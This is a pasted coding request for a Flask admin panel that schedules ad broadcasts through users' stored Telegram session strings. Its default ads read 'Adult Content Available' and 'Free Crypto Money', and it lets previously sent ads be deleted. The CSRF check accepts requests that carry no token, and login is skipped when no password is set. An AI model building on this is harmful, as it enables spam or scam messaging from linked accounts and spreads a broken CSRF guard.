}

async function doReset(btn){
  await withBusy(btn, async () => {
    const d = await api('/reset-ads', {method:'POST'});
    if(d && d.success){
      ADS = d.ads; document.getElementById('captionText').value = '';
      document.getElementById('mediaWrap').style.display = 'none';
      renderAds(); showToast(d.message); closeModal('resetModal');
    } else showToast((d && d.error) || 'Failed', 'error');
  });
}
async function openPreview(){
  openModal('previewModal');
  const box = document.getElementById('adPreviewBox');
  box.innerHTML = '<p class="muted">Loading…</p>';
  const d = await api('/preview');
  if(!d || !d.success){ box.innerHTML = '<p class="muted">Failed to load preview.</p>'; return; }
  const parts = [];
  if(d.media_file){
    const src = BASE + '/uploads/' + d.media_file + '?t=' + Date.now();
    parts.push(d.media_type === 'video'
      ? `<video class="ad-preview-media" src="${src}" controls></video>`
      : `<img class="ad-preview-media" src="${src}">`);
  }
  let cap = esc(d.caption || '');
  const links = (d.ads || []).filter(a => a.enabled !== false);
  if(links.length) cap += (cap ? '\n\n' : '') + links.map(a => '• ' + esc(a.text || a.label || '')).join('\n');
  if(cap) parts.push(`<div class="ad-preview-caption">${cap}</div>`);
  box.innerHTML = parts.length ? parts.join('') : '<p class="muted">Nothing configured yet.</p>';
}

async function openDiagnostics(){
  openModal('diagModal');
  const box = document.getElementById('diagBody');
  box.innerHTML = '<p class="muted">Loading…</p>';
  const d = await api('/diagnostics');
  if(!d || !d.success){ box.innerHTML = '<p class="muted">Failed.</p>'; return; }
  let html = '<h4 style="font-family:\'Space Grotesk\';margin-bottom:10px">Checks</h4>';
  (d.checks || []).forEach(c => {
    html += `<div class="chk ${c.ok ? 'ok' : 'bad'}"><span class="dot"></span>
      <span class="lbl">${esc(c.label)}</span>
      <span class="detail">${esc(c.detail || '')}</span></div>`;
  });
  html += `<h4 style="font-family:'Space Grotesk';margin:18px 0 10px">Numbers</h4>
    <div class="chk"><span class="lbl">Total users</span><span class="detail">${d.total_users}</span></div>
    <div class="chk"><span class="lbl">Subscribed</span><span class="detail">${d.subscribed}</span></div>
    <div class="chk ${d.users_without_session ? 'bad' : 'ok'}"><span class="dot"></span>
      <span class="lbl">Users without session_string</span><span class="detail">${d.users_without_session}</span></div>
    <div class="chk"><span class="lbl">Due right now</span><span class="detail">${d.due_now}</span></div>
    <div class="chk"><span class="lbl">Active ad links</span><span class="detail">${d.active_links}</span></div>
    <div class="chk ${d.media && d.media.exists ? 'ok' : 'bad'}"><span class="dot"></span>
      <span class="lbl">Media on disk</span><span class="detail">${esc((d.media && d.media.file) || 'none')}</span></div>
    <div class="chk"><span class="lbl">Next broadcast</span><span class="detail">${esc(d.next_broadcast_at || '—')}</span></div>`;
  if(d.last_error){
    html += `<div class="chk bad" style="margin-top:14px"><span class="dot"></span>
      <span class="lbl">Last error: ${esc(d.last_error.message)}</span></div>`;
  }
  box.innerHTML = html;
}

function lineEl(rec){
  const el = document.createElement('div');
  el.className = 'logline ' + rec.level;
  el.dataset.level = rec.level;
  el.innerHTML = `<span class="lts">${esc(rec.ts)}</span>` +
                 `<span class="lvl">${String(rec.level).toUpperCase()}</span>` +
                 `<span class="lmsg">${esc(rec.message)}</span>`;
  return el;
}
async function pollLogs(){
  if(LOG_PAUSED) return;
  const d = await api('/logs?since=' + LOG_LAST);
  if(!d || d.success === false) return;
  const box = document.getElementById('logBox');
  (d.logs || []).forEach(rec => {
    LOG_LAST = Math.max(LOG_LAST, rec.id);
    box.appendChild(lineEl(rec));
  });
  while(box.children.length > 500) box.removeChild(box.firstChild);
  const atBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 60;
  if(atBottom) box.scrollTop = box.scrollHeight;

  if(d.counters){
    document.getElementById('cOk').textContent = d.counters.success || 0;
    document.getElementById('cInfo').textContent = d.counters.info || 0;
    document.getElementById('cWarn').textContent = d.counters.warn || 0;
    document.getElementById('cErr').textContent = d.counters.error || 0;
    document.getElementById('cAll').textContent =
      (d.counters.success || 0) + (d.counters.info || 0) + (d.counters.warn || 0) + (d.counters.error || 0);
    const eb = document.getElementById('errBadge');
    const e = d.counters.error || 0;
    eb.classList.toggle('err', e > 0);
    eb.textContent = 'Errors: ' + e;
  }
  const banner = document.getElementById('errBanner');
  if(d.last_error){
    banner.classList.add('show');
    document.getElementById('errText').textContent = d.last_error.ts + ' — ' + d.last_error.message;
  } else banner.classList.remove('show');
}
function setFilter(f){
  document.getElementById('logBox').className = 'logbox f-' + f;
  document.querySelectorAll('.chip[data-f]').forEach(c => c.classList.toggle('active', c.dataset.f === f));
}
function showErrorsOnly(){ setFilter('error'); }
function togglePause(){
  LOG_PAUSED = !LOG_PAUSED;
  document.getElementById('pauseChip').classList.toggle('active', LOG_PAUSED);
  document.getElementById('pauseChip').textContent = LOG_PAUSED ? 'Resume' : 'Pause';
}
async function clearLogs(){
  const d = await api('/logs/clear', {method:'POST'});
  if(d && d.success){
    document.getElementById('logBox').innerHTML = '';
    ['cOk','cInfo','cWarn','cErr','cAll'].forEach(i => document.getElementById(i).textContent = '0');
    document.getElementById('errBanner').classList.remove('show');
    showToast(d.message);
  }
}

async function refreshStats(){
  const d = await api('/stats/refresh');
  if(!d || d.success === false) return;
  document.getElementById('statTotal').textContent = d.total_users ?? 0;
  document.getElementById('statSubscribed').textContent = d.opted_in ?? 0;
  document.getElementById('statDeliveries').textContent = d.total_deliveries ?? 0;
  document.getElementById('quickSessions').textContent = d.active_sessions ?? 0;
  document.getElementById('quickBroadcastMode').textContent = d.broadcast_mode_users ?? 0;
  document.getElementById('quickOnline').textContent = d.online_users ?? 0;
  document.getElementById('quickRegisteredToday').textContent = d.registered_today ?? 0;
  if(typeof d.broadcaster_running === 'boolean') setScheduler(d.broadcaster_running);
}

(function init(){
  const hasMedia = {{ 'true' if (config.media_path or config.photo_path) else 'false' }};
  const mediaFile = {{ (config.media_path or config.photo_path) | tojson if (config.media_path or config.photo_path) else 'null' }};
  const mediaType = {{ (config.media_type or 'photo') | tojson }};
  if(hasMedia && mediaFile){
    const name = String(mediaFile).replace(/\\/g, '/').split('/').pop();
    const img = document.getElementById('photoPrev'), vid = document.getElementById('videoPrev');
    if(mediaType === 'video'){ vid.src = BASE + '/uploads/' + name; vid.style.display = 'block'; }
    else { img.src = BASE + '/uploads/' + name; img.style.display = 'block'; }
  }
  setAdEnabled(true);
  const box = document.getElementById('logBox');
  {% for rec in initial_logs %}
  box.appendChild(lineEl({{ rec | tojson }}));
  LOG_LAST = Math.max(LOG_LAST, {{ rec.id }});
  {% endfor %}
  box.scrollTop = box.scrollHeight;
  setFilter('all');
})();

setInterval(pollLogs, 3000);
setInterval(refreshStats, 30000);
pollLogs();
refreshStats();
</script>
</body>
</html>



Nexa/admin_routes.py isse properly frontend connect and working kro pura 

import os
import uuid
import hmac
from datetime import datetime, timedelta

from flask import (Blueprint, render_template, request, jsonify,
                   send_from_directory, session, redirect, url_for)
from bson import ObjectId
from bson.errors import InvalidId
from werkzeug.utils import secure_filename

import Nexa.database as dbmod
from config import (UPLOAD_FOLDER, MIN_INTERVAL_MIN, MAX_INTERVAL_MIN,
                    ADMIN_PASSWORD, BACKGROUND_VIDEO)
from Nexa.database import (get_ads_config, update_ads_config, reset_ads_config,
                           mutate_ads, get_stats, get_all_users, allowed_file,
                           delete_photo_file, media_kind, get_videos, update_videos,
                           reschedule_all_after_interval_change)
from Nexa.broadcaster import ads_broadcaster
from Nexa.session_manager import session_manager, session_cleaner
from Nexa.logs import (get_logs, clear_logs, get_counters, reset_counters,
                       last_error, info, warn, error)

admin_bp = Blueprint("admin", __name__, template_folder="../templates")


def _authed():
    if not ADMIN_PASSWORD:
        return True
    return session.get("admin_ok") is True


def _csrf():
    if "csrf" not in session:
        session["csrf"] = uuid.uuid4().hex
    return session["csrf"]


@admin_bp.before_request
def _guard():
    if request.endpoint == "admin.login":
        return None
    if not _authed():
        if request.path.startswith("/admin/api/"):
            return jsonify({"success": False, "error": "unauthorized"}), 401
        return redirect(url_for("admin.login"))
    if request.method in ("POST", "PUT", "DELETE"):
        token = request.headers.get("X-CSRF-Token") or request.form.get("csrf")
        if token and not hmac.compare_digest(token, _csrf()):
            return jsonify({"success": False, "error": "bad csrf"}), 403
    return None


@admin_bp.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("admin_login.html", csrf=_csrf(), bg_video=BACKGROUND_VIDEO)
    if not ADMIN_PASSWORD:
        session["admin_ok"] = True
        return redirect(url_for("admin.admin_panel"))
    if hmac.compare_digest(request.form.get("password", ""), ADMIN_PASSWORD):
        session["admin_ok"] = True
        return redirect(url_for("admin.admin_panel"))
    return render_template("admin_login.html", csrf=_csrf(), error="Wrong password",
                           bg_video=BACKGROUND_VIDEO)


@admin_bp.route("/logout")
def logout():
    session.pop("admin_ok", None)
    return redirect(url_for("admin.login"))


def _media_file(path):
    return os.path.basename(path) if path else None


def _valid_url(u):
    return isinstance(u, str) and u.startswith(("http://", "https://"))


def _pull_schedule_forward(max_wait_sec=90, new_wait_sec=30):
    users_col = dbmod.users_col
    if users_col is None:
        return 0
    try:
        cutoff = datetime.now() + timedelta(seconds=max_wait_sec)
        target = datetime.now() + timedelta(seconds=new_wait_sec)
        r = users_col.update_many(
            {"ads_enabled": True, "next_ad_time": {"$gt": cutoff}},
            {"$set": {"next_ad_time": target}},
        )
        return r.modified_count
    except Exception as e:
        warn(f"reschedule forward failed: {e}")
        return 0


def _parse_ad_payload(data):
    text = (data.get("text") or data.get("label") or "").strip()
    url = (data.get("url") or "").strip()
    enabled = data.get("enabled", True)
    if not text:
        return None, "link text required"
    if not _valid_url(url):
        return None, "url must start with http:// or https://"
    return {"text": text, "url": url, "enabled": bool(enabled)}, None


def _media_state():
    c = get_ads_config()
    p = c.get("media_path") or c.get("photo_path")
    if not p:
        return {"configured": False, "exists": False, "file": None}
    exists = False
    for cand in (p, os.path.join(UPLOAD_FOLDER, os.path.basename(p))):
        try:
            if cand and os.path.isfile(cand):
                exists = True
                break
        except (OSError, ValueError):
            pass
    return {"configured": True, "exists": exists, "file": os.path.basename(p)}


@admin_bp.route("/")
def admin_panel():
    config = get_ads_config()
    stats = get_stats()
    stats["active_sessions"] = session_manager.get_active_count()
    stats["broadcaster_running"] = ads_broadcaster.is_running()
    return render_template("admin.html", config=config, stats=stats,
                           videos=get_videos(), csrf=_csrf(),
                           bg_video=BACKGROUND_VIDEO,
                           initial_logs=get_logs(limit=150),
                           counters=get_counters())


@admin_bp.route("/stats")
def admin_stats_page():
    stats = get_stats()
    stats["active_sessions"] = session_manager.get_active_count()
    stats["broadcaster_running"] = ads_broadcaster.is_running()
    return render_template("stats.html", stats=stats, users=get_all_users(),
                           config=get_ads_config(), csrf=_csrf(),
                           bg_video=BACKGROUND_VIDEO)


@admin_bp.route("/api/config")
def api_config():
    c = get_ads_config()
    media = c.get("media_path") or c.get("photo_path")
    return jsonify({
        "success": True,
        "ads_enabled": c.get("ads_enabled", False),
        "interval_minutes": c.get("interval", 1800) // 60,
        "caption": c.get("caption", ""),
        "caption_is_html": c.get("caption_is_html", False),
        "media_file": _media_file(media),
        "media_type": c.get("media_type") or "photo",
        "ads": c.get("ads", []),
        "videos": get_videos(),
        "delete_after_round": c.get("delete_after_round", False),
        "broadcaster_running": ads_broadcaster.is_running(),
        "limits": {"min": MIN_INTERVAL_MIN, "max": MAX_INTERVAL_MIN},
        "csrf": _csrf(),
    })


@admin_bp.route("/api/toggle-ads", methods=["POST"])
def toggle_ads():
    c = get_ads_config()
    new = not c.get("ads_enabled", False)
    if not update_ads_config({"ads_enabled": new}):
        return jsonify({"success": False, "error": "update failed"}), 500
    if dbmod.users_col is not None:
        dbmod.users_col.update_many({}, {"$set": {"ads_enabled": new}})
    if new:
        ads_broadcaster.start()
        session_cleaner.start()
    else:
        ads_broadcaster.stop()
        session_cleaner.stop()
    return jsonify({"success": True, "enabled": new,
                    "message": f"Broadcast {'started' if new else 'stopped'}"})


@admin_bp.route("/api/toggle-delete-after-round", methods=["POST"])
def toggle_delete_after_round():
    current = dbmod.get_delete_after_round()
    new = not current

    persisted = dbmod.set_delete_after_round(new)
    if persisted is None:
        error("delete toggle: write did not land")
        return jsonify({"success": False, "error": "update failed"}), 500

    info(f"Delete previous ads: {'ON' if persisted else 'OFF'}")
    return jsonify({
        "success": True,
        "delete_after_round": persisted,
        "message": f"Previous ads will {'be deleted' if persisted else 'be kept'} before each send",
    })


@admin_bp.route("/api/set-interval", methods=["POST"])
def set_interval():
    data = request.get_json(silent=True) or {}
    try:
        m = int(float(data.get("interval")))
    except (TypeError, ValueError):
        return jsonify({"success": False, "error": "interval required"}), 400
    if not (MIN_INTERVAL_MIN <= m <= MAX_INTERVAL_MIN):
        return jsonify({"success": False,
                        "error": f"interval {MIN_INTERVAL_MIN}-{MAX_INTERVAL_MIN} min"}), 400
    if update_ads_config({"interval": m * 60}):
        reschedule_all_after_interval_change(m * 60)
        info(f"Interval set to {m} min")
        return jsonify({"success": True, "minutes": m,
                        "message": f"Interval set to {m} min"})
    return jsonify({"success": False, "error": "update failed"}), 500


@admin_bp.route("/api/set-caption", methods=["POST"])
def set_caption():
    d = request.get_json(silent=True) or {}
    if update_ads_config({
        "caption": d.get("caption", ""),
        "caption_is_html": bool(d.get("caption_is_html", False)),
    }):
        n = _pull_schedule_forward()
        info(f"Caption updated ({n} user(s) rescheduled)")
        return jsonify({"success": True, "message": "Caption updated"})
    return jsonify({"success": False, "error": "update failed"}), 500


@admin_bp.route("/api/ads", methods=["POST"])
def add_ad():
    d = request.get_json(silent=True) or {}
    payload, err = _parse_ad_payload(d)
    if err:
        return jsonify({"success": False, "error": err}), 400
    payload["id"] = uuid.uuid4().hex[:8]
    new = mutate_ads(lambda ads: ads + [payload])
    if new is None:
        return jsonify({"success": False, "error": "update failed"}), 500
    info(f"Ad link added: {payload['text']}")
    return jsonify({"success": True, "ads": new, "message": "Link ad added"})


@admin_bp.route("/api/ads/<ad_id>", methods=["PUT"])
def edit_ad(ad_id):
    d = request.get_json(silent=True) or {}
    payload, err = _parse_ad_payload(d)
    if err:
        return jsonify({"success": False, "error": err}), 400

    def mut(ads):
        for a in ads:
            if a.get("id") == ad_id:
                a.update(payload)
                return ads
        return None

    new = mutate_ads(mut)
    if new is None:
        return jsonify({"success": False, "error": "not found"}), 404
    return jsonify({"success": True, "ads": new, "message": "Link ad updated"})


@admin_bp.route("/api/ads/<ad_id>", methods=["DELETE"])
def delete_ad(ad_id):
    def mut(ads):
        n = [a for a in ads if a.get("id") != ad_id]
        return n if len(n) != len(ads) else None
    new = mutate_ads(mut)
    if new is None:
        return jsonify({"success": False, "error": "not found"}), 404
    return jsonify({"success": True, "ads": new, "message": "Link ad deleted"})


@admin_bp.route("/api/reset-ads", methods=["POST"])
def reset_ads():
    old_media = reset_ads_config()
    if old_media is None and get_ads_config() is None:
        return jsonify({"success": False, "error": "reset failed"}), 500
    if old_media:
        delete_photo_file(old_media)
    info("Ads reset to defaults")
    return jsonify({"success": True, "ads": get_ads_config().get("ads", []),
                    "message": "Ads reset to defaults"})


@admin_bp.route("/api/videos", methods=["GET"])
def api_videos():
    return jsonify({"success": True, "videos": get_videos()})


@admin_bp.route("/api/videos", methods=["POST"])
def api_save_videos():
    d = request.get_json(silent=True) or {}
    vids = d.get("videos") or []
    if not isinstance(vids, list):
        return jsonify({"success": False, "error": "videos must be a list"}), 400
    for v in vids:
        url = (v.get("url") or "").strip()
        if url and not _valid_url(url):
            return jsonify({"success": False, "error": f"bad url: {url}"}), 400
    if not update_videos(vids):
        return jsonify({"success": False, "error": "update failed"}), 500
    info("Web videos updated")
    return jsonify({"success": True, "videos": get_videos(), "message": "Videos saved"})


@admin_bp.route("/api/upload-photo", methods=["POST"])
def upload_photo():
    if "photo" not in request.files:
        return jsonify({"success": False, "error": "no file"}), 400
    f = request.files["photo"]
    if not f or f.filename == "":
        return jsonify({"success": False, "error": "no file selected"}), 400
    if not allowed_file(f.filename):
        return jsonify({"success": False, "error": "bad file type"}), 400

    ext = f.filename.rsplit(".", 1)[1].lower()
    kind = media_kind(f.filename)
    name = secure_filename(f"ad_media_{datetime.now():%Y%m%d_%H%M%S}.{ext}")
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    path = os.path.join(UPLOAD_FOLDER, name)
    f.save(path)

    old = get_ads_config().get("media_path") or get_ads_config().get("photo_path")
    update_ads_config({"media_path": path, "media_type": kind, "photo_path": None})
    if old and old != path:
        delete_photo_file(old)

    n = _pull_schedule_forward()
    info(f"{kind} uploaded ({name}) - {n} user(s) rescheduled")
    return jsonify({"success": True, "media_file": name, "media_type": kind,
                    "message": f"{kind} uploaded"})


@admin_bp.route("/api/remove-photo", methods=["POST"])
def remove_photo():
    c = get_ads_config()
    old = c.get("media_path") or c.get("photo_path")
    update_ads_config({"media_path": None, "media_type": None, "photo_path": None})
    delete_photo_file(old)
    _pull_schedule_forward()
    info("Media removed")
    return jsonify({"success": True, "message": "media removed"})


@admin_bp.route("/uploads/<path:filename>")
def serve_upload(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)


@admin_bp.route("/api/preview")
def preview_ad():
    c = get_ads_config()
    media = c.get("media_path") or c.get("photo_path")
    return jsonify({
        "success": True,
        "media_file": _media_file(media),
        "media_type": c.get("media_type") or "photo",
        "caption": c.get("caption", ""),
        "caption_is_html": c.get("caption_is_html", False),
        "ads": c.get("ads", []),
        "interval_minutes": c.get("interval", 1800) // 60,
        "ads_enabled": c.get("ads_enabled", False),
        "delete_after_round": c.get("delete_after_round", False),
    })


@admin_bp.route("/api/broadcast-now", methods=["POST"])
def broadcast_now():
    users_col = dbmod.users_col
    if users_col is None:
        return jsonify({"success": False, "error": "db down"}), 500
    try:
        n = users_col.update_many(
            {"ads_enabled": True},
            {"$set": {"next_ad_time": datetime.now()}},
        ).modified_count
    except Exception as e:
        error(f"broadcast-now failed: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

    if not ads_broadcaster.is_running():
        ads_broadcaster.start()
    ads_broadcaster.run_now()
    info(f"Manual broadcast queued for {n} user(s)")
    return jsonify({"success": True, "queued": n,
                    "message": f"{n} user(s) queued - watch the log below"})


@admin_bp.route("/api/test-send/<user_id>", methods=["POST"])
def test_send(user_id):
    users_col = dbmod.users_col
    if users_col is None:
        return jsonify({"success": False, "error": "db down"}), 500
    try:
        oid = ObjectId(user_id)
    except (InvalidId, TypeError):
        return jsonify({"success": False, "error": "bad id"}), 400
    u = users_col.find_one({"_id": oid})
    if not u:
        return jsonify({"success": False, "error": "not found"}), 404
    if not u.get("session_string"):
        warn(f"test send: {u.get('phone')} has no session_string")
        return jsonify({"success": False,
                        "error": "this user has no session_string - re-link them"}), 400
    ads_broadcaster.send_test(u)
    return jsonify({"success": True, "message": f"Test queued for {u.get('phone')}"})


@admin_bp.route("/api/user/<user_id>/toggle", methods=["POST"])
def toggle_user_ads(user_id):
    users_col = dbmod.users_col
    if users_col is None:
        return jsonify({"success": False, "error": "db down"}), 500
    try:
        oid = ObjectId(user_id)
    except (InvalidId, TypeError):
        return jsonify({"success": False, "error": "bad id"}), 400
    u = users_col.find_one({"_id": oid})
    if not u:
        return jsonify({"success": False, "error": "not found"}), 404
    new = not u.get("ads_enabled", True)
    users_col.update_one({"_id": oid}, {"$set": {"ads_enabled": new}})
    return jsonify({"success": True, "enabled": new})


@admin_bp.route("/api/user/<user_id>/reschedule", methods=["POST"])
def reschedule_user(user_id):
    users_col = dbmod.users_col
    if users_col is None:
        return jsonify({"success": False, "error": "db down"}), 500
    try:
        oid = ObjectId(user_id)
    except (InvalidId, TypeError):
        return jsonify({"success": False, "error": "bad id"}), 400
    users_col.update_one({"_id": oid}, {"$set": {"next_ad_time": datetime.now()}})
    return jsonify({"success": True, "message": "queued for next tick"})


@admin_bp.route("/api/stats/refresh")
def refresh_stats():
    s = get_stats()
    s["active_sessions"] = session_manager.get_active_count()
    s["broadcaster_running"] = ads_broadcaster.is_running()
    return jsonify(s)


@admin_bp.route("/api/logs")
def api_logs():
    try:
        since = int(request.args.get("since", 0))
    except (TypeError, ValueError):
        since = 0
    level = request.args.get("level") or "all"
    return jsonify({
        "success": True,
        "logs": get_logs(since_id=since, limit=400, level=level),
        "counters": get_counters(),
        "last_error": last_error(),
    })


@admin_bp.route("/api/logs/clear", methods=["POST"])
def api_logs_clear():
    n = clear_logs()
    reset_counters()
    return jsonify({"success": True, "cleared": n, "message": f"{n} log line(s) cleared"})


@admin_bp.route("/api/diagnostics")
def diagnostics():
    users_col = dbmod.users_col
    cfg = get_ads_config()
    media = _media_state()

    total = subs = no_session = due = 0
    if users_col is not None:
        try:
            total = users_col.count_documents({})
            subs = users_col.count_documents({"ads_enabled": True})
            no_session = dbmod.count_users_missing_session()
            due = dbmod.count_due_now()
        except Exception:
            pass

    ads = cfg.get("ads", [])
    active_links = sum(1 for a in ads if a.get("enabled", True)
                       and (a.get("url") or "").startswith("http"))

    checks = []

    def chk(ok, label, detail=""):
        checks.append({"ok": bool(ok), "label": label, "detail": detail})

    chk(dbmod.db_connected, "MongoDB connected")
    chk(ads_broadcaster.is_running(), "Broadcaster running")
    chk(cfg.get("ads_enabled", False), "Broadcast enabled")
    chk(subs > 0, "Has subscribed users", f"{subs}")
    chk(no_session == 0, "All users have a session_string",
        f"{no_session} missing" if no_session else "")
    chk(not media["configured"] or media["exists"], "Media file present on disk",
        media["file"] or "none")
    chk(active_links > 0, "At least one active ad link", f"{active_links}")
    chk(bool((cfg.get("caption") or "").strip()) or bool(active_links) or media["configured"],
        "Something to send (caption / link / media)")

    le = last_error()

    return jsonify({
        "success": True,
        "db_connected": dbmod.db_connected,
        "broadcaster_running": ads_broadcaster.is_running(),
        "ads_enabled": cfg.get("ads_enabled", False),
        "interval_minutes": cfg.get("interval", 1800) // 60,
        "next_broadcast_at": (cfg.get("next_broadcast_at").strftime("%Y-%m-%d %H:%M:%S")
                              if isinstance(cfg.get("next_broadcast_at"), datetime) else None),
        "total_users": total,
        "subscribed": subs,
        "users_without_session": no_session,
        "due_now": due,
        "active_links": active_links,
        "media": media,
        "counters": get_counters(),
        "last_error": le,
        "checks": checks,
    })


@admin_bp.route("/api/clear-messages", methods=["POST"])
def clear_messages():
    msgs = dbmod.broadcast_msgs_col
    if msgs is None:
        return jsonify({"success": False, "error": "db down"}), 500
    try:
        n = msgs.count_documents({})
        msgs.delete_many({})
        return jsonify({"success": True, "cleared_count": n})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


fix Nexa/logs.py


import threading
from collections import deque
from datetime import datetime

_MAX = 600

_lock = threading.Lock()
_seq = 0
_buffer = deque(maxlen=_MAX)
_counters = {"info": 0, "warn": 0, "error": 0, "success": 0}

LEVELS = ("info", "warn", "error", "success")


def blog(level, message, source="broadcast", mirror=True):
    global _seq
    if level not in LEVELS:
        level = "info"
    with _lock:
        _seq += 1
        rec = {
            "id": _seq,
            "ts": datetime.now().strftime("%H:%M:%S"),
            "level": level,
            "source": source,
            "message": str(message),
        }
        _buffer.append(rec)
        _counters[level] = _counters.get(level, 0) + 1
    if mirror:
        try:
            print(f"[{rec['ts']}] [{level.upper()}] {rec['message']}", flush=True)
        except Exception:
            pass
    return rec


def info(m, source="broadcast"):    return blog("info", m, source)
def success(m, source="broadcast"): return blog("success", m, source)
def warn(m, source="broadcast"):    return blog("warn", m, source)
def error(m, source="broadcast"):   return blog("error", m, source)


def get_logs(since_id=0, limit=300, level=None):
    with _lock:
        items = list(_buffer)
    if since_id:
        items = [r for r in items if r["id"] > since_id]
    if level and level != "all":
        items = [r for r in items if r["level"] == level]
    return items[-limit:]


def clear_logs():
    with _lock:
        n = len(_buffer)
        _buffer.clear()
    return n


def get_counters():
    with _lock:
        return dict(_counters)


def reset_counters():
    with _lock:
        for k in _counters:
            _counters[k] = 0


def last_error():
    with _lock:
        for rec in reversed(_buffer):
            if rec["level"] == "error":
                return rec
    return None



fix Nexa/database.py


import os
import time
import uuid
import threading
import html as _html
from datetime import datetime, timedelta

import requests
from pymongo import MongoClient, ASCENDING, DESCENDING, ReturnDocument
from pymongo.errors import PyMongoError

from config import (
    MONGODB_URI, DB_NAME, BOT_TOKEN, CHANNEL_ID,
    DEFAULT_INTERVAL_SEC, UPLOAD_FOLDER,
)
from Nexa.logs import info, warn, error

# ---------------------------------------------------------------- state

mongo_client = None
db = None
db_connected = False

users_col = None
ads_config_col = None
temp_sessions_col = None
ads_logs_col = None
broadcast_msgs_col = None

_config_lock = threading.RLock()
_db_lock = threading.RLock()

_last_ping = 0.0
_PING_INTERVAL = 30

ALLOWED_IMAGE_EXT = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
ALLOWED_VIDEO_EXT = {"mp4", "mov", "avi", "mkv", "webm", "m4v", "3gp"}
ALLOWED_EXT       = ALLOWED_IMAGE_EXT | ALLOWED_VIDEO_EXT

VIDEO_SLOTS = 5

DEFAULT_ADS = [
    {"id": "ad1", "kind": "link", "text": "Adult Content Available",
     "url": "https://example.com/adult", "enabled": True},
    {"id": "ad2", "kind": "link", "text": "Free Crypto Money",
     "url": "https://example.com/crypto", "enabled": True},
]

DEFAULT_VIDEOS = [{"title": f"Video {i + 1}", "url": ""} for i in range(VIDEO_SLOTS)]

_CFG_DEFAULTS = {
    "ads_enabled": False,
    "interval": DEFAULT_INTERVAL_SEC,
    "caption": "",
    "caption_is_html": False,
    "media_path": None,
    "media_type": None,
    "photo_path": None,
    "delete_after_round": True,
    "next_broadcast_at": None,
    "total_broadcasts": 0,
    "last_broadcast_at": None,
}


# ---------------------------------------------------------------- helpers

def _as_bool(value, default=False):
    if isinstance(value, bool):
        return value
    if value is None:
        return default
    return str(value).strip().lower() in ("1", "true", "yes", "on")


def _safe(fn, default=None, label="db op"):
    try:
        return fn()
    except PyMongoError as exc:
        warn(f"{label} failed: {type(exc).__name__}: {exc}", source="db")
    except Exception as exc:
        warn(f"{label} failed: {type(exc).__name__}: {exc}", source="db")
    return default


def _default_config():
    config = {"_id": "main_config", "updated_at": datetime.now()}
    config.update(_CFG_DEFAULTS)
    config["ads"] = [dict(ad) for ad in DEFAULT_ADS]
    config["videos"] = [dict(v) for v in DEFAULT_VIDEOS]
    return config


def _normalize_ad(ad):
    """Migrate every historical ad shape into the current one.
    New ads are text links; old inline-button ads keep kind='button' so the
    admin panel can offer a one-click conversion."""
    ad = dict(ad or {})
    if not ad.get("id"):
        ad["id"] = uuid.uuid4().hex[:8]
    ad.setdefault("enabled", True)

    kind = ad.get("kind")
    if kind == "link":
        ad["text"] = ad.get("text") or ad.get("label") or ""
        ad.pop("label", None)
        ad.pop("has_button", None)
        return ad
    if kind == "button":
        ad["label"] = ad.get("label") or ad.get("text") or ""
        return ad

    # legacy shapes: {has_button, label, url}
    if ad.get("has_button"):
        return {"id": ad["id"], "kind": "button",
                "label": ad.get("label", ""), "url": ad.get("url", ""),
                "enabled": ad.get("enabled", True)}
    return {"id": ad["id"], "kind": "link",
            "text": ad.get("text") or ad.get("label", ""),
            "url": ad.get("url", ""), "enabled": ad.get("enabled", True)}


def _ensure_indexes():
    """Create indexes. Never raises - a bad index must not kill a live
    connection (this used to catch only PyMongoError, so an AttributeError on
    a not-yet-bound collection tore down the whole client)."""
    try:
        if users_col is not None:
            users_col.create_index([("phone", ASCENDING)])
            users_col.create_index([("user_id", ASCENDING)])
            users_col.create_index([("ads_enabled", ASCENDING)])
            users_col.create_index([("next_ad_time", ASCENDING)])
            users_col.create_index([("ads_enabled", ASCENDING),
                                    ("next_ad_time", ASCENDING)])
            users_col.create_index([("created_at", DESCENDING)])
        if temp_sessions_col is not None:
            temp_sessions_col.create_index([("created_at", ASCENDING)])
        if broadcast_msgs_col is not None:
            broadcast_msgs_col.create_index([("broadcast_id", ASCENDING)])
            broadcast_msgs_col.create_index([("user_id", ASCENDING)])
    except Exception as exc:
        warn(f"index creation failed: {type(exc).__name__}: {exc}", source="db")


def _bind(database):
    """Bind every collection handle from a live database object."""
    global users_col, ads_config_col, temp_sessions_col, ads_logs_col, broadcast_msgs_col
    users_col = database.users
    ads_config_col = database.ads_config
    temp_sessions_col = database.temp_sessions
    ads_logs_col = database.ads_logs
    broadcast_msgs_col = database.broadcast_msgs


def _unbind():
    global users_col, ads_config_col, temp_sessions_col, ads_logs_col, broadcast_msgs_col
    users_col = ads_config_col = temp_sessions_col = None
    ads_logs_col = broadcast_msgs_col = None


# ---------------------------------------------------------------- connect

def _connect():
    global mongo_client, db, db_connected, _last_ping

    with _db_lock:
        old_client = mongo_client
        mongo_client = None
        db = None
        db_connected = False
        _unbind()

        if old_client is not None:
            try:
                old_client.close()
            except Exception:
                pass

        if not MONGODB_URI:
            error("MONGODB_URI is not configured", source="db")
            _last_ping = time.time()
            return False

        client = None
        try:
            client = MongoClient(
                MONGODB_URI,
                serverSelectionTimeoutMS=5000,
                connectTimeoutMS=5000,
                socketTimeoutMS=15000,
                retryWrites=True,
                maxPoolSize=50,
            )
            database = client[DB_NAME]
            client.admin.command("ping")

            # Only publish the new state once the connection is proven good.
            mongo_client = client
            db = database
            _bind(database)
            db_connected = True
            _last_ping = time.time()

            info("MongoDB connected", source="db")
            _ensure_indexes()          # cannot raise now
            return True

        except Exception as exc:
            error(f"MongoDB connection failed: {type(exc).__name__}: {exc}", source="db")
            if client is not None:
                try:
                    client.close()
                except Exception:
                    pass
            mongo_client = None
            db = None
            db_connected = False
            _unbind()
            _last_ping = time.time()
            return False


def ensure_db():
    global _last_ping, db_connected
    with _db_lock:
        now = time.time()
        if mongo_client is None or not db_connected:
            return _connect()
        if now - _last_ping < _PING_INTERVAL:
            return True
        try:
            mongo_client.admin.command("ping")
            db_connected = True
            _last_ping = time.time()
            return True
        except Exception as exc:
            warn(f"MongoDB ping failed: {exc}", source="db")
            return _connect()


def init_db():
    return _connect()


